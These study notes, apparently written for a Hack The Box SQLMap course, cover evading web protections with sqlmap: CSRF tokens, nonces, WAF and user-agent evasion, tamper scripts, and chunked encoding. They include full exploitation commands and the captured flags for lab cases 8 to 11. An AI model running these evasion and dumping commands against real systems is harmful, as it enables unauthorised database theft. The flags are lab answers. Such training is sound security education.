# Section 9 — Bypassing Web Application Protections

---

## Anti-CSRF Token Bypass

Some forms include a Cross-Site Request Forgery (CSRF) token. Every request needs a fresh token value or the server rejects it. `--csrf-token` tells sqlmap to read the current token from the response and include the new value in each next request.

```bash
sqlmap -u "TARGET" \
  --data="id=1&t0ken=ABC123..." \
  --csrf-token="t0ken"
```
> Handles CSRF token renewal automatically. sqlmap reads the current token from the response, extracts the new value, and includes it in each subsequent request. Replace `TARGET`, the data body, and the token field name (`t0ken`) with your target's values.

If the token parameter name contains the words `csrf`, `xsrf`, or `token`, sqlmap detects it automatically. Custom names like `t0ken` are not detected. You must specify them with `--csrf-token`.

---

## Unique-Value (Nonce) Bypass

Some apps require a unique value on every request, such as `uid=2933249978`. If the same value is sent twice, the server rejects it. `--randomize` generates a new random value on each request. The new value matches the original's format and length.

```bash
sqlmap -u "TARGET/?id=1&uid=2933249978" --randomize=uid
```
> Generates a new random value for `uid` on every request, matching the format of the original value. Use this when an app rejects repeat values or requires a unique parameter. Replace `TARGET` and the parameter name/value with your target's values.

---

## Calculated Parameter Bypass

Some apps require one parameter to be computed from another. For example, `h=md5(id)` means the `h` value must be the MD5 hash of whatever `id` is. `--eval` runs Python code before each request to compute the dependent value automatically.

```bash
sqlmap -u "TARGET/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" \
  --eval="import hashlib; h=hashlib.md5(str(id).encode()).hexdigest()"
```
> Computes a dependent parameter before each request using Python. The `--eval` code runs once per request with the current values of other parameters available as variables. Replace the hash algorithm and computation with whatever your target requires.

---

## IP / Anonymity

| Option | Use |
|--------|-----|
| `--proxy="socks4://IP:PORT"` | Single proxy |
| `--proxy-file=proxies.txt` | List — rotates on blacklist |
| `--tor` | Auto-detect local Tor SOCKS port (9050/9150) |
| `--check-tor` | Verify Tor is actually being used (hits torproject.org) |

---

## WAF / IDS Detection

sqlmap automatically probes for Web Application Firewalls (WAFs) at the start of a scan. It sends a malicious payload to a non-existent parameter and checks how the server responds. If a WAF is detected, sqlmap identifies the product using identYwaf signatures, which cover 80+ WAF products.

```bash
sqlmap -u "TARGET" --skip-waf   # disable detection for stealth
```
> Disables sqlmap's automatic WAF detection probe. Use this when you don't want sqlmap to send a noisy detection request at the start of the scan, or when the probe triggers an IP block. Replace `TARGET` with your target's URL.

> ModSecurity returns 406 on the WAF probe. Cloudflare, AWS WAF, Imperva have distinct fingerprints.

---

## User-Agent Bypass

sqlmap sends a default User-Agent (UA) string of `sqlmap/1.x.x (http://sqlmap.org)`. Most WAFs block this string immediately.

```bash
sqlmap -u "TARGET" --random-agent   # rotates browser UA strings
sqlmap -u "TARGET" --mobile         # mimics smartphone UA
```
> Replaces sqlmap's default User-Agent with a real browser string. `--random-agent` picks a random UA from a built-in list on each request. `--mobile` specifically mimics a mobile browser. Use one of these on every scan — sqlmap's default UA is blocked by most WAFs.

---

## Tamper Scripts

Tamper scripts are Python scripts that modify payloads right before they are sent. Chain multiple scripts together with commas:

```bash
sqlmap -u "TARGET" --tamper=between,randomcase
sqlmap --list-tampers   # show all available scripts
```
> Applies tamper scripts that modify payloads before sending to bypass WAF rules. Chain multiple scripts with commas. `--list-tampers` prints all available scripts with brief descriptions. Replace `TARGET` with your target's URL.

Most useful tampers (CPTS-relevant):

| Script | Effect |
|--------|--------|
| `between` | Replaces `>` with `NOT BETWEEN 0 AND #`, `=` with `BETWEEN # AND #` — bypasses primitive `<`/`>` filters |
| `equaltolike` | Replaces `=` with `LIKE` |
| `randomcase` | `SELECT` → `SeLeCt` — bypasses simple keyword blocklists |
| `space2comment` | Replaces spaces with `/**/` |
| `space2plus` | Replaces spaces with `+` |
| `space2randomblank` | Replaces spaces with random whitespace alternatives |
| `percentage` | `SELECT` → `%S%E%L%E%C%T` (ASP-specific) |
| `0eunion` | `UNION` → `e0UNION` (numeric type confusion bypass) |
| `base64encode` | Base64-encode entire payload |
| `modsecurityversioned` | Wrap query in MySQL versioned comment |

---

## Other Bypasses

```bash
# Split POST body into chunks — splits SQL keywords across them
sqlmap -u "TARGET" --data="id=1" --chunked

# HTTP Parameter Pollution — ASP-style concatenation across duplicate params
# (no flag, just craft request: ?id=1&id=UNION&id=SELECT&...)
```
> Two additional bypass methods. `--chunked` splits the POST body using `Transfer-Encoding: chunked`, spreading SQL keywords across chunk boundaries to evade signature matching. HTTP Parameter Pollution has no sqlmap flag — craft it manually in the request file passed with `-r req.txt`.

---

## Lab — Cases 8, 9, 10, 11

**Target:** `154.57.164.72:30732`

### Case 8 — Anti-CSRF token (`t0ken`)

```bash
sqlmap -u "http://154.57.164.72:30732/case8.php" \
  --data="id=1&t0ken=<grab-current-token>" \
  --csrf-token="t0ken" -p id \
  --dbms=mysql --batch --technique=U --no-cast \
  --dump -T flag8
```

> Non-standard token name `t0ken` — wouldn't auto-detect without `--csrf-token` flag.

**flag8:** `HTB{y0u_h4v3_b33n_c5rf_70k3n1z3d}`

---

### Case 9 — Unique `uid` value

```bash
sqlmap -u "http://154.57.164.72:30732/case9.php?id=1&uid=2933249978" \
  --randomize=uid -p id \
  --dbms=mysql --batch --technique=U --no-cast \
  --dump -T flag9
```

**flag9:** `HTB{700_much_r4nd0mn355_f0r_my_74573}`

---

### Case 10 — Primitive UA filter

```bash
sqlmap -u "http://154.57.164.72:30732/case10.php" \
  --data="id=1" --random-agent -p id \
  --dbms=mysql --batch --technique=U --no-cast \
  --dump -T flag10
```

> App blocks the default sqlmap UA string — `--random-agent` rotates to a real browser UA.

**flag10:** `HTB{y37_4n07h3r_r4nd0m1z3}`

---

### Case 11 — `<` and `>` character filter

```bash
sqlmap -u "http://154.57.164.72:30732/case11.php?id=1" \
  --tamper=between -p id \
  --dbms=MySQL --batch --no-cast --flush-session \
  -D testdb -T flag11 --dump
```

> `between` tamper rewrites `>` → `NOT BETWEEN 0 AND #` and `=` → `BETWEEN # AND #`, avoiding the filtered characters entirely. `--flush-session` is needed to discard cached failed-detection data from prior runs.

**flag11:** `HTB{5p3c14l_ch4r5_n0_m0r3}`

---

## Exam Notes

- `--csrf-token=<name>` is required when the token field name doesn't contain `csrf`/`xsrf`/`token`
- `--randomize` matches the format of the original value (length, charset) automatically
- `--random-agent` should be standard — sqlmap's UA is in every WAF signature list
- For `<`/`>` filters → `--tamper=between`; for space filters → `space2comment`/`space2plus`
- `--flush-session` clears cached state — use it when a previous failed run is polluting detection
- Chain tampers carefully — priority order matters; some tampers conflict

## Sources

- [HTB Forum — SQLMap Essentials Case 11](https://forum.hackthebox.com/t/sqlmap-essentials-bypassing-web-application-protections-case-11/271907)
- [missteek/cpts-quick-references — SQLMap Essentials](https://github.com/missteek/cpts-quick-references/blob/main/module/sqlmap%20Essentials.md)
